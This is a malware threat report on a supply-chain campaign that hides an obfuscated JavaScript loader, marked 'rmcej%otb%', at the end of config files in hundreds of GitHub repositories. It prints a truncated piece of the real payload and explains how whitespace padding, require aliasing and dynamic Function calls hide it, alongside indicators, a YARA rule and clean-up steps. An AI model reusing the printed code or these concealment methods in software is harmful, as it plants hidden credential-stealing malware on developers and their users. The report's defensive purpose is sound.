# Threat Report: PolinRider campaign using `rmcej%otb%` Obfuscated JS Payload

**Date:** 2026-03-07  
**Research:** [OpenSourceMalware.com](https://opensourcemalware.com)  
**Query:** [`rmcej%otb%` on GitHub Code Search](https://github.com/search?q=rmcej%25otb%25&ref=opensearch&type=code)  
**Severity:** High — active supply chain infection across 483 public repositories

---

## Summary

A malicious obfuscated JavaScript payload identified by the string `rmcej%otb%` has been found injected into legitimate JavaScript config files across **483 public GitHub repositories** belonging to **283 unique owners** (243 individual users, 40 organisations).

The payload is appended to the end of real project config files — silently, after the file's legitimate content — making it easy to miss during casual code review. The primary infection vector appears to be a compromised npm package that executes during install or build and injects itself into config files in the project root.

---

## Impact Statistics

| Metric | Count |
|--------|-------|
| Total GitHub search results | 482 (API cap: 500 returned) |
| Unique repositories infected | 483 |
| Unique owners affected | 283 |
| — Individual users | 243 |
| — Organisations | 40 |

---

## Infected File Types

The payload was found in the following file types, ordered by frequency:

| File | Count |
|------|-------|
| `postcss.config.mjs` | 303 |
| `tailwind.config.js` | 57 |
| `eslint.config.mjs` | 52 |
| `next.config.mjs` | 12 |
| `App.js` | 8 |
| `.eslintrc.cjs` | 6 |
| `index.js` | 6 |
| `astro.config.mjs` | 5 |
| `tailwind.config.mjs` | 5 |
| `auth.js` | 3 |
| `tailwind.config.cjs` | 2 |
| `postcss.config.cjs` | 2 |
| `webpack.config.js` | 2 |
| `server.js` | 2 |
| `config.js` | 2 |
| `index.ts` | 1 |
| *(other)* | ~9 |

The dominance of `postcss.config.mjs` (303 of 483 repos, ~63%) strongly points to a compromised PostCSS or Tailwind CSS-adjacent npm package as the primary infection vector.

---

## Payload Analysis

### Injection Pattern

The payload is appended after the legitimate file content, preceded by a large block of whitespace to push it off-screen. Example from `postcss.config.mjs` in `brown2020/ikigaifinder`:

```js
/** @type {import('postcss-load-config').Config} */
const config = {
  plugins: {
    '@tailwindcss/postcss': {},
  },
};

export default config;
                                        [~200 spaces]
global['!']='4-1422';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);...
```

### Stage 1 — String Shuffle Cipher

The marker string `rmcej%otb%` is passed through a character-shuffle function with numeric seed `2857687`. The shuffle produces a decoded string array used to:

- Store `require` in `global['!']` (bypasses static analysis looking for `require`)
- Store `module` in a global variable
- Bootstrap a dynamic second-stage loader

### Stage 2 — Dynamic Code Construction

A second obfuscated function (`sfL`) with seed `2667686` decodes a long encoded string (`joW`) into JavaScript source, which is then passed to `Function()` (constructed dynamically to avoid static detection) and executed.

The second-stage payload (partially decoded) performs network callbacks, file system operations, and environment variable exfiltration consistent with an **infostealer / initial access trojan**.

### Key Obfuscation Techniques

- Character-shuffle cipher with hardcoded numeric seeds
- `global['!']` aliasing of `require` to evade static analysis
- Large whitespace block before payload to hide it below the visible editor viewport
- Multi-stage loading — each stage decodes and executes the next
- Legitimate file content preserved in full to avoid breaking the project build

---

## Likely Infection Vector

Given that:

1. `postcss.config.mjs` accounts for 63% of infections
2. Affected repos span a wide range of unrelated projects and owners
3. The injection appears automated and consistent across all files
4. The file content before the payload is always legitimate and valid

The most probable vector is a **malicious npm package** (likely in the PostCSS/Tailwind ecosystem) that runs a postinstall script or hooks into the build process to inject the payload into config files in the working directory. The developer's own committed config file then becomes the persistence mechanism, spreading the payload to anyone who clones the repo.

Possible package categories to investigate:
- PostCSS plugins
- Tailwind CSS plugins or utilities
- Build tooling wrappers (Next.js utilities, Vite plugins)
- Developer productivity packages with broad install bases

---

## Affected Repositories (Sample)

The full list of 483 repos is in `affected_repos.csv`. A representative sample:

| Repository | Owner | Type | Infected File |
|------------|-------|------|---------------|
| `brown2020/ikigaifinder` | brown2020 | User | `postcss.config.mjs` |
| `Victorola-coder/tewo` | Victorola-coder | User | `tailwind.config.js` |
| `dawahanigeria-team/rayyan-server` | dawahanigeria-team | Org | `eslint.config.mjs` |
| `addis-ale/better-auth-level` | addis-ale | User | `src/index.ts` |
| `PratikRaval123/DemoTask` | PratikRaval123 | User | `tailwind.config.cjs` |

Full data: see `affected_repos.csv` and `affected_users.csv`.

---

## Indicators of Compromise (IOCs)

### Static Signatures

| Type | Value |
|------|-------|
| String marker | `rmcej%otb%` |
| Global alias | `global['!']='4-1422'` |
| Cipher seed 1 | `2857687` |
| Cipher seed 2 | `2667686` |
| Variable prefix | `_$_1e42` |

### Behavioural Indicators

- `require` aliased to `global['!']` at runtime
- `Function()` called with dynamically constructed string argument
- Config files contain content after `export default` / `module.exports`
- Large horizontal whitespace block (100+ spaces) before injected payload

### YARA Rule (Suggested)

```yara
rule rmcej_otb_payload {
    meta:
        description = "Detects rmcej%otb% shuffle-cipher JS payload injected into config files"
        author = "OpenSourceMalware.com"
        date = "2026-03-07"
        severity = "high"

    strings:
        $marker   = "rmcej%otb%"
        $global   = "global['!']"
        $seed1    = "2857687"
        $seed2    = "2667686"
        $varname  = "_$_1e42"

    condition:
        $marker or ($global and $seed1) or ($varname and $seed2)
}
```

---

## Recommended Actions

**For affected repo owners:**
1. Audit all JS config files (`postcss.config.*`, `tailwind.config.*`, `eslint.config.*`, `next.config.*`) for content appearing after `export default` or `module.exports`
2. Review `package.json` dependencies — particularly any recently added or updated PostCSS/Tailwind-related packages
3. Check `node_modules` for postinstall scripts: `grep -r "postinstall" node_modules/*/package.json`
4. Rotate any secrets, tokens, or credentials that may have been present in the environment during a build
5. Force-push clean config files and consider signing commits going forward

**For security tooling / registries:**
- Add YARA/regex rule for `rmcej%otb%` to static analysis pipelines
- Flag packages with postinstall scripts that write to project root config files
- Cross-reference affected repo owners against recently published npm packages

---

## Files

| File | Description |
|------|-------------|
| `rmcej-otb-threat-report.md` | This report |
| `affected_repos.csv` | All 483 affected repositories with owner, type, file paths, and URLs |
| `affected_users.csv` | All 283 affected owners with repo counts and links |

---

## References

- GitHub Code Search: https://github.com/search?q=rmcej%25otb%25&ref=opensearch&type=code
- OpenSourceMalware.com: https://opensourcemalware.com

---

*Research conducted using the GitHub Code Search API. Data collected 2026-03-07.*
